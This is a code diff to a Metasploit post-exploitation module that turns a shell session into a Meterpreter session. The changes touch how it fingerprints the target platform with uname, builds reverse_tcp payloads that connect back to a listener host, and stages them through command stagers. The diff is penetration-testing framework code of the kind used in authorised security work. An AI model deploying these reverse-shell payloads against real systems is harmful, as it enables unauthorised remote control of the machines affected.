@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
     register_options(
       [
         OptAddress.new('LHOST',
-          [true, 'IP of host that will receive the connection from the payload.']),
+          [false, 'IP of host that will receive the connection from the payload.']),
         OptInt.new('LPORT',
           [false, 'Port for Payload to connect to.', 4433]),
         OptBool.new('HANDLER',
@@ -63,11 +63,6 @@ class Metasploit3 < Msf::Post
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
-    when /linux/i
-      platform = 'linux'
-      payload_name = 'linux/x86/meterpreter/reverse_tcp'
-      lplat = [Msf::Platform::Linux]
-      larch = [ARCH_X86]
     when /osx/i
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
@@ -75,17 +70,16 @@ class Metasploit3 < Msf::Post
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
     else
-      # Find the best fit
-      target_info = cmd_exec('uname -a')
-      if target_info =~ /linux/i
-        #TODO: Add detection for non x86 linux platforms and switch
-        #      to a better payload.
+      # Find the best fit, be specific w/ uname to avoid matching hostname or something else
+      target_info = cmd_exec('uname -mo')
+      if target_info =~ /linux/i && target_info =~ /x86/
+        # Handle linux shells that were identified as 'unix'
         platform = 'linux'
         payload_name = 'linux/x86/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
       elsif cmd_exec("python -V") =~ /Python 2\.(\d)/
-        # Generic fallback
+        # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
       end
@@ -96,7 +90,7 @@ class Metasploit3 < Msf::Post
       return nil
     end
 
-    payload_data = generate_payload(payload_name,lhost,lport)
+    payload_data = generate_payload(lhost,lport,payload_name)
     if payload_data.blank?
       print_error("Unable to build a suitable payload for #{session.platform} using payload #{payload_name}.")
       return nil
@@ -104,7 +98,7 @@ class Metasploit3 < Msf::Post
 
 
     if datastore['HANDLER']
-      listener_job_id = create_multihandler(datastore['LHOST'],datastore['LPORT'],payload_name)
+      listener_job_id = create_multihandler(lhost,lport,payload_name)
       if listener_job_id.blank?
         print_error("Failed to start multi/handler on #{datastore['LPORT']}, it may be in use by another process.")
         return nil
@@ -148,6 +142,7 @@ class Metasploit3 < Msf::Post
       opts[:decoder] = File.join(Msf::Config.data_directory, "exploits", "cmdstager", "vbs_b64")
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
+      opts[:background] = true
       cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
       # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
       #       as /bin/sh on OS X doesn't support the -n option on echo
@@ -171,6 +166,7 @@ class Metasploit3 < Msf::Post
       #
       sent = 0
       cmds.each { |cmd|
+        print_status("#{cmd}")  #FIXFIX - Remove
         ret = session.shell_command_token(cmd)
         if (not ret)
           aborted = true
@@ -293,7 +289,7 @@ class Metasploit3 < Msf::Post
 
   end
 
-  def generate_payload(payload_name,lhost,lport)
+  def generate_payload(lhost,lport,payload_name)
     payload = framework.payloads.create(payload_name)
     options = "LHOST=#{lhost} LPORT=#{lport}"
     buf = payload.generate_simple('OptionStr' => options)
